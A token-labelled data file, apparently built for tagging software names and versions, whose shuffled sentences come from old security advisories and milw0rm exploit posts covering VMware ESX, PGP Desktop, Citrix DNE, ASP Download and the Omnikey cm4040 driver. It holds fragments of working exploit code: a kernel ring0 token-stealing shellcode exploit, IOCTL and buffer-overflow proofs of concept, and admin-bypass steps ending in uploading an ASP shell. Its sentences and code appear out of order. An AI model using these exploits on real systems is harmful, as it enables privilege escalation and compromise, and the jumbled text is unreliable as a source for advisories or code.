SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
- O
VMware O
Security O
Advisory O
Advisory O
ID O
: O
VMSA-2010-0010 O
Synopsis O
: O
ESX O
3.5 O
third O
party O
update O
for O
Service O
Console O
kernel O
Issue O
date O
: O
2010-06-24 O
Updated O
on O
: O
2010-06-24 O
( O
initial O
release O
of O
advisory O
) O
CVE O
numbers O
: O
CVE-2008-5029 O
CVE-2008-5300 O
CVE-2009-1337 O
CVE-2009-1385 O
CVE-2009-1895 O
CVE-2009-2848 O
CVE-2009-3002 O
CVE-2009-3547 O
CVE-2009-2698 O
CVE-2009-2692 O
- O
1 O
. O

Extended O
support O
for O
ESX O
3.0.3 O
ends O
on O
2011-12-10 O
. O

Summary O
ESX O
3.5 O
Console O
OS O
( O
COS O
) O
updates O
for O
COS O
package O
kernel O
. O

References O
CVE O
numbers O
- O
6 O
. O

Relevant O
releases O
VMware O
ESX O
3.5 O
without O
patch O
ESX350-201006401-SG O
Notes O
: O
Effective O
May O
2010 O
, O
VMware O
patch O
and O
update O
release O
program O
during O
Extended O
Support O
will O
be O
continued O
with O
the O
condition O
that O
all O
subsequent O
patch O
and O
update O
releases O
will O
be O
based O
on O
the O
latest O
baseline O
release O
version O
as O
of O
May O
2010 O
( O
i.e O
. O

Refer O
to O
section O
End O
of O
Product O
Availability O
FAQs O
at O
for O
details O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2008-5029 O
, O
CVE-2008-5300 O
, O
CVE-2009-1337 O
, O
CVE-2009-1385 O
, O
CVE-2009-1895 O
, O
CVE-2009-2848 O
, O
CVE-2009-3002 O
, O
and O
CVE-2009-3547 O
to O
the O
security O
issues O
fixed O
in O
kernel-2.4.21-63 O
. O

The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
names O
CVE-2009-2698 O
, O
CVE-2009-2692 O
to O
the O
security O
issues O
fixed O
in O
kernel-2.4.21-60 O
. O

ESX O
3.5 O
md5sum O
: O
b89fb8a51c4a896bc0bf297b57645d1d O
5 O
. O

Problem O
Description O
a O
. O

VMware O
Product O
Running O
Replace O
with O
Product O
Version O
on O
Apply O
Patch O
VirtualCenter O
any O
Windows O
not O
affected O
hosted O
any O
any O
not O
affected O
ESXi O
any O
ESXi O
not O
affected O
ESX O
4.0 O
ESX O
not O
applicable O
ESX O
3.5 O
ESX O
ESX350-201006401-SG O
ESX O
3.0.3 O
ESX O
affected O
, O
no O
update O
planned O
vMA O
4.0 O
RHEL5 O
not O
applicable O
hosted O
products O
are O
VMware O
Workstation O
, O
Player O
, O
ACE O
, O
Server O
, O
Fusion O
. O

Contact O
E-mail O
list O
for O
product O
security O
notifications O
and O
announcements O
: O
This O
Security O
Advisory O
is O
posted O
to O
the O
following O
lists O
: O
security-announce O
at O
lists.vmware.com O
bugtraq O
at O
securityfocus.com O
full-disclosure O
at O
lists.grok.org.uk O
E-mail O
: O
security O
at O
vmware.com O
PGP O
key O
at O
: O
VMware O
Security O
Center O
VMware O
security O
response O
policy O
General O
support O
life O
cycle O
policy O
VMware O
Infrastructure O
support O
life O
cycle O
policy O
Copyright O
2010 O
VMware O
Inc. O
All O
rights O
reserved O
. O

Service O
Console O
update O
for O
COS O
kernel O
The O
service O
console O
package O
kernel O
is O
updated O
to O
version O
2.4.21-63 O
. O

Users O
should O
plan O
to O
upgrade O
to O
at O
least O
ESX O
3.5 O
and O
preferably O
to O
the O
newest O
release O
available O
. O

Column O
4 O
of O
the O
following O
table O
lists O
the O
action O
required O
to O
remediate O
the O
vulnerability O
in O
each O
release O
, O
if O
a O
solution O
is O
available O
. O

ESX O
3.0.3 O
Update O
1 O
, O
ESX O
3.5 O
Update O
5 O
, O
and O
VirtualCenter O
2.5 O
Update O
6 O
) O
. O

Change O
log O
2010-06-24 O
VMSA-2010-0010 O
Initial O
security O
advisory O
after O
release O
of O
patches O
for O
ESX O
3.5 O
on O
2010-06-24 O
- O
7 O
. O

VMSA-2010-0010 O
ESX O
3.5 O
third O
party O
update O
for O
Service O
Console O
kernel O

Disclosed O
apparently O
next O
week O
. O

Subject O
: O
CVE-2009-2692 O
kernel O
: O
uninit O
op O
in O
SOCKOPS_WRAP O
( O
) O
leads O
to O
privesc O
Marcus O
Meissner O
wrote O
: O
Apparently O
new O
root O
exploit O
from O
Brad O
, O
see O
his O
twitter O
: O
The O
video O
is O
a O
bit O
sick O
in O
my O
opinion O
. O

Date O
: O
Fri O
, O
14 O
Aug O
2009 O
09:12:52 O
+0800 O
From O
: O
Eugene O
Teo O
< O
eugeneteo O
@ O
... O
nel.sg O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

So O
, O
the O
cat O
is O
out O
of O
the O
bag O
. O

Thanks O
, O
Eugene O

The O
exploit O
is O
available O
, O
but O
so O
is O
the O
patch O
. O

Subject O
: O
CVE-2009-2692 O
kernel O
: O
uninit O
op O
in O
SOCKOPS_WRAP O
( O
) O
leads O
to O
privesc O

Million SN
Dollar SN
Text SN
Links SN
1.0 SV
does O
not O
properly O
restrict O
administrator O
access O
to O
admin.home.php O
, O
which O
allows O
remote O
attackers O
to O
bypass O
intended O
restrictions O
and O
gain O
privileges O
via O
a O
direct O
request O
to O
admin.home.php O
after O
visiting O
admin.php O
. O

Vendor O
: O
Dollar SN
Text SN
Links SN
1.0 SV
Authenication O
Bypass O
: O
Go O
to O
Control O
Bypassed O
: O
) O
And O
You O
Have O
ALL O
Permission O
: O
= O
) O
Dem0 O
To O
ALL O
My O
Friends O
( O
Dz O
) O
milw0rm.com O
[ O
2009-05-04 O
] O

Million SN
Dollar SN
Text SN
Links SN
1.0 SV
Authenication O
Bypass O
Founder O
: O
ThE O
g0bL O
! O
N O
Home O
: O
WwW.h4ckF0u.CoM O

Million SN
Dollar SN
Text SN
Links SN
1.0 SV
- O
Arbitrary O
Authentication O
Bypass O

Unspecified O
vulnerability O
in O
WMI O
Mapper O
for O
HP SN
Systems SN
Insight SN
Manager SN
before SV
2.5.2.0 SV
allows O
local O
users O
to O
gain O
privileges O
via O
unknown O
vectors O
. O

Stack-based O
buffer O
overflow O
in O
Apple SN
Mac SN
OS SN
X SN
10.5 SV
before SV
10.5.7 SV
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
application O
crash O
) O
by O
attempting O
to O
mount O
a O
crafted O
sparse O
disk O
image O
. O

Todd SN
Woolums SN
ASP SN
Download SN
management SN
script SN
1.03 SV
does O
not O
require O
authentication O
for O
setupdownload.asp O
, O
which O
allows O
remote O
attackers O
to O
gain O
administrator O
privileges O
via O
a O
direct O
request O
. O

[ O
+ O
] O
How O
to O
Exploit O
: O
1 O
) O
Go O
to O
: O
Change O
the O
Info O
3 O
) O
Login O
with O
the O
new O
informations O
in O
default.asp O
page O
4 O
) O
Upload O
an O
ASP O
shell O
from O
the O
upload.asp O
page O
So O
simple O
! O

[ O
+ O
] O
Greetz O
: O
stack O
, O
Bl O
@ O
ckbe O
@ O
rD O
, O
Djekmani O
, O
HouSSamiX O
milw0rm.com O
[ O
2008-06-10 O
] O

ASPDownload SN
v O
1.03 SV
Remote O
Admin O
Bypass O
Exploit O
Author O
: O
Underz0ne O
Crew O
[ O
+ O
] O
Script O
: O
ASPDownload SN
v O
1.03 SV
[ O
+ O
] O
Risk O
: O
High O
[ O
+ O
] O
Script O
URL O
: O
Dork O
: O
Powered O
by O
AspDownload O
Exploit O
Area O
Description O
: O
The O
problem O
is O
that O
the O
script O
owner O
doesnt O
request O
a O
Login O
page O
for O
the O
DANGEROUS O
file O
setupdownload.asp O
where O
we O
can O
RESET O
the O
admin O
access O
and O
change O
the O
admin O
informations O
for O
whatever O
we O
want O
! O

ASP SN
Download SN
1.03 SV
- O
Arbitrary O
Change O
Administrator O
Account O

The O
PGPwded O
device O
driver O
( O
aka O
PGPwded.sys O
) O
in O
PGP SN
Corporation SN
PGP SN
Desktop SV
9.0.6 SV
build SV
6060 SV
and SV
9.9.0 SV
build SV
397 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
) O
and O
possibly O
gain O
privileges O
via O
a O
certain O
METHOD_BUFFERED O
IOCTL O
request O
that O
overwrites O
portions O
of O
memory O
, O
related O
to O
a O
Driver O
Collapse O
. O

{ O
DOT O
} O
com O
Website O
Since O
we O
had O
publishing O
problems O
, O
we O
used O
spaces O
between O
escape O
< O
char O
and O
the O
include O
file O
as O
shown O
here O
: O
include O
< O
windows.h O
> O
, O
to O
compile O
you O
have O
to O
delete O
the O
space O
. O

include O
< O
windows.h O
include O
< O
stdio.h O
include O
< O
stdlib.h O
int O
main O
( O
void O
) O
{ O
HANDLE O
hDevice O
; O
DWORD O
Dummy O
; O
system O
( O
cls O
) O
; O
printf O
( O
. O

milw0rm.com O
[ O
2008-12-23 O
] O

Use O
of O
the O
information O
constitutes O
acceptance O
for O
use O
in O
an O
AS O
IS O
condition O
. O

There O
is O
no O
representation O
or O
warranties O
, O
either O
express O
or O
implied O
by O
or O
with O
respect O
to O
anything O
in O
this O
document O
, O
and O
shall O
not O
be O
liable O
for O
a O
ny O
implied O
warranties O
of O
merchantability O
or O
fitness O
for O
a O
particular O
purpose O
or O
for O
any O
indirect O
special O
or O
consequential O
damages O
. O

: O
: O
PGP O
Enterprise O
DoS O
Proof O
of O
Concept O
: O
: O
. O

) O
; O
hDevice O
= O
CreateFileA O
( O
. O

Affected O
Component O
: O
PGPwded.sys O
Category O
: O
Local O
Denial O
of O
Service O
( O
BSOD O
) O
( O
untested O
) O
Local O
Privilege O
Escalation O
+ O
+ O
[ O
Details O
] O
PGP O
Desktop O
PGPweded.sys O
Driver O
does O
not O
sanitize O
user O
supplied O
input O
( O
IOCTL O
) O
and O
this O
lead O
to O
a O
Driver O
Collapse O
that O
propagates O
on O
the O
system O
with O
a O
BSOD O
. O

PGPwdef O
, O
0 O
, O
FILE_SHARE_READ O
| O
FILE_SHARE_WRITE O
, O
NULL O
, O
OPEN_EXISTING O
, O
0 O
, O
NULL O
) O
; O
if O
( O
hDevice O
INVALID_HANDLE_VALUE O
) O
{ O
printf O
( O
Unable O
to O
Open O
PGPwded O
Device O
Driver O
) O
; O
return O
EXIT_FAILURE O
; O
} O
DeviceIoControl O
( O
hDevice O
, O
0x80022038 O
, O
( O
LPVOID O
) O
0x80000001 O
, O
0 O
, O
( O
LPVOID O
) O
0x80000002 O
, O
0 O
, O
& O
Dummy O
, O
( O
LPOVERLAPPED O
) O
NULL O
) O
; O
return O
EXIT_SUCCESS O
Special O
Thanks O
: O
To O
_g_ O
of O
orange-bat O
that O
developed O
IOCTL-Proxy O
a O
really O
effective O
IOCTL O
Fuzzer O
Evilcry O
Bonfa O
Disclaimer O
: O
The O
information O
in O
the O
advisory O
is O
believed O
to O
be O
accurate O
at O
the O
time O
of O
publishing O
based O
on O
currently O
available O
information O
. O

[ O
PGP SN
Desktop SV
9.0.6 SV
Denial O
Of O
Service O
] O
Author O
: O
Giuseppe O
Evilcry O
Bonfa O
E-Mail O
: O
evilcry O
{ O
AT O
} O
GMAIL O
{ O
DOT O
} O
COM O
Profile O
: O
Date O
: O
23/12/2008 O
+ O
+ O
Product O
: O
PGP O
Desktop O
9.0.6 O
[ O
Build O
6060 O
] O
( O
other O
version O
could O
be O
affected O
) O

Affected O
IOCTL O
is O
0x80022038 O
+ O
+ O
Device O
Type O
: O
Custom O
Device O
Type O
: O
0x8002 O
, O
32770 O
Transfer O
Type O
: O
METHOD_BUFFERED O
( O
0x0 O
, O
0 O
) O
Access O
Type O
: O
FILE_ANY_ACCESS O
( O
0x0 O
, O
0 O
) O
Function O
Code O
: O
0x80E O
, O
2062 O
+ O
+ O
From O
Crash O
Dump O
Analysis O
we O
obtain O
a O
KERNEL_MODE_EXCEPTION_NOT_HANDLED O
( O
8e O
) O
, O
could O
also O
exists O
the O
possibility O
of O
a O
Local O
Privilege O
Escalation O
, O
but O
I O
ve O
not O
checked O
it O
PGPwded.sys O
KERNEL_MODE_EXCEPTION_NOT_HANDLED O
- O
DoS O
PoC O
Author O
: O
Giuseppe O
Evilcry O
Bonfa O
E-Mail O
: O
evilcry O
{ O
AT O
} O
gmail O
. O

PGP SN
Desktop SV
9.0.6 SV
- O
PGPwded.sys O
Local O
Denial O
of O
Service O

Affected O
: O
PGPwded.sys O
Release O
Date O
: O
Release O
Date O
. O

Affected O
: O
PGP SN
Desktop SV
9.0.6 SV
[ O
Build SV
6060 SV
] O
( O
other O
version O
could O
be O
affected O
) O
Component O

Proof-of-Concept O
: O
< O
a O
href= O
vice_POC.php O
> O
Click O
Here O
< O
/a O
Credit O
: O
Giuseppe O
Evilcry O
Bonfa O
( O
Team O
Lead O
, O
Disclaimer O
: O
The O
information O
in O
the O
advisory O
is O
believed O
to O
be O
accurate O
at O
the O
time O
of O
publishing O
based O
on O
currently O
available O
information O
. O

Description O
: O
PGP O
Desktop O
PGPweded.sys O
Driver O
does O
not O
sanitize O
user O
supplied O
input O
( O
IOCTL O
) O
and O
this O
lead O
to O
a O
Driver O
Collapse O
that O
propagates O
on O
the O
system O
with O
a O
BSOD O
. O

Affected O
IOCTL O
is O
0x80022038 O
. O

Advisory O
: O
PGP SN
Desktop SV
9.0.6 SV
Denial O
Of O
Service O
Vulnerability O
. O

PGP SN
Desktop SV
9.0.6 SV
Denial O
Of O
Service O
- O
ZeroDay O

DNE O
device O
interface O
. O

dne2000.sys O
in O
Citrix SN
Deterministic SN
Network SN
Enhancer SN
( O
DNE SN
) O
2.21.7.233 SV
through SV
3.21.7.17464 SV
, O
as O
used O
in O
( O
1 O
) O
Cisco O
VPN O
Client O
, O
( O
2 O
) O
Blue O
Coat O
WinProxy O
, O
and O
( O
3 O
) O
SafeNet O
SoftRemote O
and O
HighAssurance O
Remote O
, O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
DNE_IOCTL O
DeviceIoControl O
request O
to O
the O
. O

x8b O
x89 O
xd8 O
x00 O
x00 O
x00 O
x89 O
x88 O
xd8 O
x00 O
x00 O
x00 O
x90 O
; O
static O
unsigned O
char O
winxp_ring0_shell O
ring0 O
xb8 O
x24 O
xf1 O
xdf O
xff O
x8b O
x00 O
x8b O
x70 O
x44 O
x89 O
xf0 O
_sys_eprocess_loop O
x8b O
x98 O
x84 O
x00 O
x00 O
x00 O
x81 O
xfb O
x04 O
x00 O
x00 O
x00 O
x74 O
x11 O
x8b O
x80 O
x8c O
x00 O
x00 O
x00 O
x2d O
x88 O
x00 O
x00 O
x00 O
x39 O
xf0 O
x75 O
xe3 O
xeb O
x21 O
_sys_eprocess_found O
x89 O
xc1 O
x89 O
xf0 O
_cmd_eprocess_loop O
x8b O
x98 O
x84 O
x00 O
x00 O
x00 O
x81 O
xfb O
x00 O
x00 O
x00 O
x00 O
x74 O
x10 O
x8b O
x80 O
x8c O
x00 O
x00 O
x00 O
x2d O
x88 O
x00 O
x00 O
x00 O
x39 O
xf0 O
x75 O
xe3 O
_not_found O
xcc O
_cmd_eprocess_found O
_ring0_end O
copy O
tokens O
! O
$ O
% O
! O

Tested O
on O
: O
dne2000.sys SN
2.21.7.233 SV
< SV
- SV
3.21.7.17464 SV
bundled O
with O
: O
SafeNET O
HighAssurance O
Remote O
, O
SoftRemote O
Cisco O
VPN O
Client O
Winproxy O
Compile O
: O
MinGW O
+ O
-lntdll O
Private O
Source O
Code O
-DO O
NOT O
DISTRIBUTE O
- O
Digit-Labs O
2008 O
! O
@ O
$ O
! O

) O
; O
CloseHandle O
( O
hFile O
) O
; O
return O
( O
EXIT_SUCCESS O
milw0rm.com O
[ O
2008-06-17 O
] O

DNE O
, O
FILE_EXECUTE O
, O
FILE_SHARE_READ|FILE_SHARE_WRITE O
, O
NULL O
, O
OPEN_EXISTING O
, O
0 O
, O
NULL O
) O
; O
if O
( O
hFile O
INVALID_HANDLE_VALUE O
) O
{ O
fprintf O
( O
stderr O
, O
CreateFileA O
failed O
, O
% O
d O
, O
hFile O
) O
; O
exit O
( O
EXIT_FAILURE O
) O
; O
} O
zpage O
= O
VirtualAlloc O
( O
NULL O
, O
0x10000 O
, O
MEM_RESERVE|MEM_COMMIT O
, O
PAGE_EXECUTE_READWRITE O
) O
; O
if O
( O
zpage O
NULL O
) O
{ O
fprintf O
( O
stderr O
, O
VirtualAlloc O
failed O
) O
; O
exit O
( O
EXIT_FAILURE O
) O
; O
} O
printf O
( O
allocated O
page O
: O
0x O
% O
08X O
[ O
% O
d-bytes O
] O
, O
zpage O
, O
0x10000 O
) O
; O
memset O
( O
zpage O
, O
0xCC O
, O
0x10000 O
) O
; O
zbuf O
= O
fixup_ring0_shell O
( O
ppid O
, O
& O
zlen O
) O
; O
memcpy O
( O
zpage O
, O
win32_fixup O
, O
sizeof O
( O
win32_fixup O
) O
- O
1 O
) O
; O
memcpy O
( O
zpage O
+ O
sizeof O
( O
win32_fixup O
) O
- O
1 O
, O
zbuf O
, O
zlen O
) O
; O
memcpy O
( O
zpage O
+ O
sizeof O
( O
win32_fixup O
) O
+ O
zlen O
- O
1 O
, O
win32_ret O
, O
sizeof O
( O
win32_ret O
) O
- O
1 O
) O
; O
memset O
( O
& O
req O
, O
0 O
, O
sizeof O
req O
) O
; O
req.req_num O
= O
DNE_FLAG O
; O
req.ptr O
= O
NULL O
; O
req.ptr O
= O
& O
items O
; O
memset O
( O
items O
, O
0 O
, O
sizeof O
items O
) O
; O
items O

dne2000-call.c O
Copyright O
( O
c O
) O
2008 O
by O
< O
mu-b O
@ O
digit-labs.org O
Deterministic O
Network O
Enhancer O
( O
dne2000.sys O
) O
local O
kernel O
ring0 O
SYSTEM O
exploit O
by O
mu-b O
- O
Sun O
06 O
Jan O
2008 O
- O

x8b O
x89 O
xc8 O
x00 O
x00 O
x00 O
x89 O
x88 O
xc8 O
x00 O
x00 O
x00 O
x90 O
; O
static O
unsigned O
char O
win32_ret O
x5e O
xc2 O
x10 O
x00 O
; O
struct O
ioctl_func O
{ O
char O
_pad O
[ O
0x04 O
] O
; O
int O
flag O
; O
char O
pad O
[ O
0x2C O
] O
; O
void O
func_ptr O
; O
} O
; O
struct O
ioctl_item O
{ O
int O
flag O
; O
char O
_pad O
[ O
0x24 O
] O
; O
struct O
ioctl_func O
item_func O
; O
struct O
ioctl_item O
item_ptr O
; O
} O
; O
struct O
ioctl_req O
{ O
int O
req_num O
; O
struct O
ioctl_item O
ptr O
; O
} O
; O
static O
PCHAR O
fixup_ring0_shell O
( O
DWORD O
ppid O
, O
DWORD O
zlen O
) O
{ O
DWORD O
dwVersion O
, O
dwMajorVersion O
, O
dwMinorVersion O
; O
dwVersion O
= O
GetVersion O
( O
) O
; O
dwMajorVersion O
= O
( O
DWORD O
) O
( O
LOBYTE O
( O
LOWORD O
( O
dwVersion O
) O
) O
) O
; O
dwMinorVersion O
= O
( O
DWORD O
) O
( O
HIBYTE O
( O
LOWORD O
( O
dwVersion O
) O
) O
) O
; O
if O
( O
dwMajorVersion O
! O
= O
5 O
) O
{ O
fprintf O
( O
stderr O
, O
GetVersion O
, O
unsupported O
version O
) O
; O
exit O
( O
EXIT_FAILURE O
) O
; O
} O
switch O
( O
dwMinorVersion O
) O
{ O
case O
1 O
: O
zlen O
= O
sizeof O
winxp_ring0_shell O
- O
1 O
; O
( O
PDWORD O
) O
& O
winxp_ring0_shell O
[ O
55 O
] O
= O
ppid O
; O
return O
( O
winxp_ring0_shell O
) O
; O
case O
2 O
: O
zlen O
= O
sizeof O
win2k3_ring0_shell O
- O
1 O

include O
< O
stdio.h O
include O
< O
stdlib.h O
include O
< O
windows.h O
include O
< O
ddk/ntapi.h O
define O
DNE_IOCTL O
0x00222008 O
define O
DNE_FLAG O
0x00001005 O
define O
ITEM_FLAG_1 O
0x4A424F4E O
define O
ITEM_FLAG_2 O
0x47554C50 O
define O
FUNC_FLAG O
0x00010003 O
static O
unsigned O
char O
win32_fixup O
x56 O
; O
static O
unsigned O
char O
win2k3_ring0_shell O
ring0 O
xb8 O
x24 O
xf1 O
xdf O
xff O
x8b O
x00 O
x8b O
xb0 O
x18 O
x02 O
x00 O
x00 O
x89 O
xf0 O
_sys_eprocess_loop O
x8b O
x98 O
x94 O
x00 O
x00 O
x00 O
x81 O
xfb O
x04 O
x00 O
x00 O
x00 O
x74 O
x11 O
x8b O
x80 O
x9c O
x00 O
x00 O
x00 O
x2d O
x98 O
x00 O
x00 O
x00 O
x39 O
xf0 O
x75 O
xe3 O
xeb O
x21 O
_sys_eprocess_found O
x89 O
xc1 O
x89 O
xf0 O
_cmd_eprocess_loop O
x8b O
x98 O
x94 O
x00 O
x00 O
x00 O
x81 O
xfb O
x00 O
x00 O
x00 O
x00 O
x74 O
x10 O
x8b O
x80 O
x9c O
x00 O
x00 O
x00 O
x2d O
x98 O
x00 O
x00 O
x00 O
x39 O
xf0 O
x75 O
xe3 O
_not_found O
xcc O
_cmd_eprocess_found O
_ring0_end O
copy O
tokens O
! O
$ O
% O
! O

) O
; O
if O
( O
argc O
< O
= O
1 O
) O
{ O
fprintf O
( O
stderr O
, O
Usage O
: O
% O
s O
< O
processid O
to O
elevate O
, O
argv O
) O
; O
exit O
( O
EXIT_SUCCESS O
) O
; O
} O
ppid O
= O
atoi O
( O
argv O
) O
; O
hFile O
= O
CreateFileA O
( O
. O

Deterministic O
Network O
Enhancer O
- O
dne2000.sys O
Kernel O
Ring0 O
SYSTEM O

zabbix_agentd SN
1.1.4 SV
in O
ZABBIX SN
before SV
1.4.3 SV
runs O
UserParameter O
scripts O
with O
gid O
0 O
, O
which O
might O
allow O
local O
users O
to O
gain O
privileges O
. O

VirusBlokAda SN
Vba32 SN
AntiVirus SN
3.12.2 SV
uses O
weak O
permissions O
( O
Everyone O
: O
Write O
) O
for O
its O
installation O
directory O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
by O
replacing O
application O
programs O
, O
as O
demonstrated O
by O
replacing O
vba32ldr.exe O
. O

Buffer O
overflow O
in O
crontab O
in O
IBM SN
AIX SN
5.2 SV
allows O
local O
users O
to O
gain O
privileges O
via O
long O
command O
line O
arguments O
. O

HP SN
System SN
Management SN
Homepage SN
( O
SMH SN
) O
before SV
2.1.9 SV
for O
Linux O
, O
when O
used O
with O
Novell O
eDirectory O
, O
assigns O
the O
eDirectory O
members O
to O
the O
root O
group O
, O
which O
allows O
remote O
authenticated O
eDirectory O
users O
to O
gain O
privileges O
. O

Format O
string O
vulnerability O
in O
F-Secure SN
Anti-Virus SN
Client SN
Security SN
6.02 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
and O
possibly O
gain O
privileges O
via O
format O
string O
specifiers O
in O
the O
Management O
Server O
name O
field O
on O
the O
Communication O
settings O
page O
. O

4 O
) O
Solution O
Fix O
: O
xes.shtml O
5 O
) O
Time O
Table O
: O
11/20/2006 O
Reported O
Vulnerability O
to O

Vendor O
published O
hot O
fix O
6 O
) O
Credits O
Discovered O
by O
Deral O
Heiland O
, O
7 O
) O
Reference O
8 O
) O
About O
Layered O
Defense O
Layered O
Defense O
, O
Is O
a O
group O
of O
security O
professionals O
that O
work O
together O
on O
ethical O
Research O
, O
Testing O
and O
Training O
within O
the O
information O
security O
arena O
. O

3 O
) O
Description O
of O
Vulnerability O
A O
format O
string O
vulnerability O
was O
discovered O
within O
F-Secure SN
Anti-Virus SN
Client SN
Security SN
Version O
6.02 SV
. O

Layered O
Defense O
Research O
Advisory O
18 O
March O
2007 O
1 O
) O

Vendor O
acknowledged O
the O
vulnerability O
03/01/2007 O

Affected O
Software O
F-Secure SN
Anti-Virus SN
Client SN
Security SN
Version O
6.02 SV
2 O
) O
Severity O
Rating O
: O
Low O
risk O
Impact O
: O
Local O
read O
write O
arbitrary O
memory O
, O
denial O
of O
service O
. O

When O
special O
crafted O
format O
strings O
are O
entered O
into O
the O
Management O
Server O
name O
field O
under O
Communication O
settings O
an O
attacker O
can O
read/write O
arbitrary O
memory O
and O
at O
a O
minimum O
can O
cause O
a O
denial O
of O
service O
condition O
. O

The O
vulnerability O
is O
due O
to O
improper O
processing O
of O
format O
strings O
when O
processing O
Management O
Server O
name O
field O
. O

Layered O
Defense O
Research O
Advisory O
: O
F-Secure SN
Anti-Virus SN
Client SN
Security SN
6.02 SV
Format O
String O
Vulnerability O

Unspecified O
vulnerability O
in O
phpMyFAQ SN
1.6.9 SV
and SV
earlier SV
, O
when O
register_globals O
is O
enabled O
, O
allows O
remote O
attackers O
to O
gain O
the O
privilege O
for O
uploading O
files O
on O
the O
server O
. O

Multiple O
buffer O
overflows O
in O
the O
( O
1 O
) O
read O
and O
( O
2 O
) O
write O
handlers O
in O
the O
Omnikey O
CardMan O
4040 O
driver O
in O
the O
Linux SN
kernel SN
before SV
2.6.21-rc3 SV
allow O
local O
users O
to O
gain O
privileges O
. O

Local O
attackers O
with O
direct O
or O
indirect O
write O
permissions O
to O
a O
cmx O
device O
file O
can O
execute O
arbitrary O
code O
with O
kernel O
privileges O
or O
may O
cause O
denial O
of O
service O
. O

COMPASS O
SECURITY O
ADVISORY O
Product O
: O
Linux O
Driver O
for O
Omnikey O
CardMan O
4040 O

Vendor O
Response O
: O
Will O
fix O
( O
Harald O
Welte O
, O
vendor-sec O
) O
Will O
fix O
but O
not O
coordinate O
release O
schedule O
( O
Omnikey O
) O
Embargo O
Until O
: O
2007-03-06 O
Daniel O
Roethlisberger O
, O
Compass O
Security O
Network O
Computing O
AG O
Glaernischstrasse O
7 O
, O
CH-8640 O
Rapperswil O
, O
Switzerland O
Tel O
+41 O
55 O
214 O
41 O
77 O
Fax O
+41 O
55 O
214 O
41 O
61 O
daniel.roethlisberger O
( O
at O
) O
csnc O
( O
dot O
) O
ch O
[ O
email O
concealed O
] O
PGP O
: O
D927 O
96F6 O
7266 O
1683 O
06CF O
F984 O
ACEC O
DBB0 O
6929 O
2CBA O
Security O
Review O
- O
Penetration O
Testing O
- O
Computer O
Forensics O

Vendor O
Status O
: O
Linux O
2.6.21-rc3 O
contains O
the O
patch O
. O

In O
such O
a O
setup O
users O
with O
access O
to O
the O
device O
can O
escalate O
privileges O
or O
cause O
DoS O
. O

Omnikey O
will O
fix O
it O
in O
their O
next O
driver O
release O
. O

Since O
normal O
APDUs O
are O
smaller O
than O
512 O
bytes O
, O
this O
may O
not O
be O
an O
issue O
, O
but O
I O
haven O
t O
looked O
into O
the O
various O
ways O
to O
cause O
data O
to O
be O
written O
indirectly O
. O

Vulnerable O
: O
Linux SN
2.4/2.6 SV
cm4040 O
drivers O
by O
Omnikey O
: O
- O
cm4040 O
v1.1.0 O
- O
cm4040 O
v1.2.0 O
- O
cm4040 O
v2.0.0 O
Linux O
2.6 O
cm4040 O
drivers O
by O
Harald O
Welte O
, O
as O
included O
in O
: O
- O
Linux O
2.6.15 O
... O
2.6.20.1 O

Vendor O
Notified O
: O
2007-02-05 O
( O
Harald O
Welte O
) O
2007-02-06 O
( O
vendor-sec O
, O
Omnikey O
) O

By O
default O
, O
direct O
access O
is O
limited O
to O
root O
. O

Of O
course O
, O
the O
write O
( O
) O
vulnerability O
is O
only O
exploitable O
by O
users O
with O
direct O
or O
indirect O
write O
access O
to O
the O
cmx O
device O
special O
file O
. O

Vendor O
: O
Omnikey O
GmbH O
Harald O
Welte O

Subject O
: O
Buffer O
Overflow O
Risk O
: O
Medium O
Effect O
: O
Locally O
exploitable O
Author O
: O
Daniel O
Roethlisberger O
( O
daniel.roethlisberger O
( O
at O
) O
csnc O
( O
dot O
) O
ch O
[ O
email O
concealed O
] O
) O
Date O
: O
2007-03-07 O
CVE O
Name O
: O
CVE-2007-0005 O
Introduction O
: O
The O
Linux O
drivers O
for O
the O
Omnikey O
CardMan O
4040 O
smartcard O
reader O
contain O
a O
buffer O
overflow O
vulnerability O
. O

Furthermore O
, O
a O
system O
can O
be O
set O
up O
to O
allow O
access O
to O
the O
device O
for O
a O
special O
user O
or O
group O
in O
order O
to O
increase O
security O
by O
running O
the O
userland O
drivers O
without O
root O
privileges O
. O

A O
malicious O
or O
buggy O
device O
sending O
more O
than O
512 O
bytes O
can O
overflow O
the O
driver O
read O
buffer O
to O
the O
same O
effect O
. O

When O
calling O
write O
( O
) O
with O
a O
buffer O
larger O
than O
512 O
bytes O
, O
the O
driver O
write O
buffer O
overflows O
, O
allowing O
to O
overwrite O
the O
EIP O
and O
execute O
arbitrary O
code O
with O
kernel O
privileges O
. O

include O
< O
sys/stat.h O
include O
< O
fcntl.h O
include O
< O
unistd.h O
include O
< O
stdlib.h O
include O
< O
stdio.h O
include O
< O
string.h O
include O
< O
errno.h O
int O
main O
( O
int O
argc O
, O
char O
argv O
[ O
] O
) O
{ O
int O
fd O
, O
i O
, O
n O
; O
char O
buf O
[ O
8192 O
0 O
1 O
2 O
3 O
4 O
5 O
6 O
7 O
8 O
9 O
a O
b O
c O
d O
e O
f O
00 O
01 O
00 O
02 O
00 O
03 O
00 O
04 O
00 O
05 O
00 O
06 O
00 O
07 O
00 O
08 O
for O
( O
i O
= O
0 O
; O
i O
< O
sizeof O
( O
buf O
) O
; O
i O
+= O
2 O
) O
{ O
buf O
[ O
i O
] O
= O
( O
char O
) O
( O
( O
( O
i/2 O
) O
& O
0xFF00 O
) O
8 O
) O
; O
buf O
[ O
i+1 O
] O
= O
( O
char O
) O
( O
( O
i/2 O
) O
& O
0x00FF O
) O
; O
} O
if O
( O
( O
fd O
= O
open O
( O
/dev/cmx0 O
, O
O_RDWR O
) O
) O
< O
0 O
) O
{ O
printf O
( O
Error O
: O
open O
( O
) O
= O
% O
s O
, O
strerror O
( O
errno O
) O
) O
; O
exit O
( O
errno O
) O
; O
} O
if O
( O
( O
n O
= O
